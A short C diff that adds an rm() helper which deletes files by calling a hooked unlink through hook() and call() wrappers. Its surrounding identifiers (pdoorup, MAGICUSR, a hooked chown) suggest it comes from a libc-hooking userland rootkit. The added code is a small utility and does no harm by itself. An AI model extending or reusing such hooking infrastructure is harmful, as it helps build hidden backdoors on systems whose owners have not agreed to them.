@@ -15,6 +15,13 @@ int pdoorup(void);
 #define MAGICUSR 0
 #define NORMLUSR 1
 
+int rm(const char *path){
+    hook(CUNLINK);
+    int ulr = (long)call(CUNLINK, path);
+    if(ulr < 0 && errno == ENOENT) return 1;
+    return ulr;
+}
+
 int chown_path(const char *path, gid_t gid){
     hook(CCHOWN);
     return (long)call(CCHOWN, path, gid, gid);
